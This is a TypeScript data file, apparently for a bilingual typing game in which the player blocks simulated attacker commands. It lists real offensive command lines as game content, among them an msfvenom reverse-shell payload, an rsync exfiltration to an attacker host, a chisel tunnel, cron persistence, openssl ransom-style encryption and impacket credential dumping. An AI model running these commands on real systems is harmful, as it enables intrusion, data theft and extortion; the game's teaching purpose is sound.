import type { Lang } from '../i18n/dict'

/**
 * Une attaque : le mot à taper est le premier jeton de la commande affichée
 * dans le terminal. Bloquer l'outil, c'est bloquer la commande.
 */
export type Attack = {
  /** Mot à taper — en minuscules, sans accent, tapable sur tout clavier. */
  word: string
  /** Ligne montrée comme si l'attaquant la tapait en direct. */
  line: string
  /** Réponse du système quand la commande est bloquée. */
  blocked: { fr: string; en: string }
  /** Conséquence quand elle passe. */
  landed: { fr: string; en: string }
  /** Poids dans la progression de l'attaque (%). */
  weight: number
}

export const attacks: Attack[] = [
  {
    word: 'nmap',
    line: 'nmap -sS -p- --min-rate 5000 10.0.0.14',
    blocked: { fr: 'balayage de ports filtré', en: 'port scan filtered' },
    landed: { fr: 'ports 22/80/5432 exposés', en: 'ports 22/80/5432 exposed' },
    weight: 8,
  },
  {
    word: 'hydra',
    line: 'hydra -l root -P rockyou.txt ssh://10.0.0.14',
    blocked: { fr: 'force brute stoppée, compte verrouillé', en: 'brute force stopped, account locked' },
    landed: { fr: 'mot de passe root trouvé', en: 'root password cracked' },
    weight: 16,
  },
  {
    word: 'sqlmap',
    line: 'sqlmap -u https://app.local/api?id=1 --dbs --batch',
    blocked: { fr: 'requête rejetée par la préparation', en: 'query rejected by prepared statement' },
    landed: { fr: 'schéma de base extrait', en: 'database schema dumped' },
    weight: 14,
  },
  {
    word: 'gobuster',
    line: 'gobuster dir -u https://app.local -w common.txt',
    blocked: { fr: 'énumération limitée par le débit', en: 'enumeration rate-limited' },
    landed: { fr: '/admin découvert', en: '/admin discovered' },
    weight: 8,
  },
  {
    word: 'msfvenom',
    line: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.9',
    blocked: { fr: 'charge utile mise en quarantaine', en: 'payload quarantined' },
    landed: { fr: 'shell distant ouvert', en: 'reverse shell opened' },
    weight: 18,
  },
  {
    word: 'tcpdump',
    line: 'tcpdump -i eth0 -w capture.pcap port 5432',
    blocked: { fr: 'trafic chiffré, capture inutile', en: 'traffic encrypted, capture useless' },
    landed: { fr: 'identifiants lus en clair', en: 'credentials read in clear' },
    weight: 10,
  },
  {
    word: 'hashcat',
    line: 'hashcat -m 1800 -a 0 shadow.hash rockyou.txt',
    blocked: { fr: 'empreintes salées, coût trop élevé', en: 'hashes salted, cost too high' },
    landed: { fr: 'empreintes cassées', en: 'hashes cracked' },
    weight: 14,
  },
  {
    word: 'chisel',
    line: 'chisel client 10.0.0.9:8080 R:5432:localhost:5432',
    blocked: { fr: 'tunnel sortant coupé', en: 'outbound tunnel severed' },
    landed: { fr: 'base pivotée vers l’extérieur', en: 'database pivoted outward' },
    weight: 16,
  },
  {
    word: 'kerbrute',
    line: 'kerbrute userenum -d corp.local users.txt',
    blocked: { fr: 'énumération d’annuaire bloquée', en: 'directory enumeration blocked' },
    landed: { fr: 'liste de comptes récupérée', en: 'account list harvested' },
    weight: 12,
  },
  {
    word: 'rsync',
    line: 'rsync -az /var/data/ attacker@10.0.0.9:/loot/',
    blocked: { fr: 'exfiltration interrompue', en: 'exfiltration interrupted' },
    landed: { fr: '4,2 Go exfiltrés', en: '4.2 GB exfiltrated' },
    weight: 20,
  },
  {
    word: 'crontab',
    line: 'crontab -l | { cat; echo "*/5 * * * * /tmp/.p"; } | crontab -',
    blocked: { fr: 'persistance retirée', en: 'persistence removed' },
    landed: { fr: 'tâche planifiée installée', en: 'scheduled task installed' },
    weight: 16,
  },
  {
    word: 'openssl',
    line: 'openssl enc -aes-256-cbc -in /var/data -out /var/data.locked',
    blocked: { fr: 'chiffrement hostile avorté', en: 'hostile encryption aborted' },
    landed: { fr: 'données prises en otage', en: 'data held hostage' },
    weight: 22,
  },
  {
    word: 'ffuf',
    line: 'ffuf -w params.txt -u https://app.local/api?FUZZ=1',
    blocked: { fr: 'fuzzing détecté et banni', en: 'fuzzing detected and banned' },
    landed: { fr: 'paramètre caché trouvé', en: 'hidden parameter found' },
    weight: 10,
  },
  {
    word: 'wireshark',
    line: 'wireshark -k -i eth0 -Y "http.authorization"',
    blocked: { fr: 'session TLS non déchiffrable', en: 'TLS session not decryptable' },
    landed: { fr: 'jeton de session capté', en: 'session token captured' },
    weight: 12,
  },
  {
    word: 'impacket',
    line: 'impacket-secretsdump corp.local/admin@10.0.0.20',
    blocked: { fr: 'accès au registre refusé', en: 'registry access denied' },
    landed: { fr: 'secrets du domaine volés', en: 'domain secrets stolen' },
    weight: 20,
  },
]

/** Le prologue joué au lancement d'une vague. */
export function intro(wave: number, lang: Lang): string[] {
  const fr = [
    `-- vague ${wave} : nouvelle session entrante`,
    'ssh -o StrictHostKeyChecking=no root@10.0.0.14',
    'uname -a && id',
  ]
  const en = [
    `-- wave ${wave}: new inbound session`,
    'ssh -o StrictHostKeyChecking=no root@10.0.0.14',
    'uname -a && id',
  ]
  return lang === 'fr' ? fr : en
}
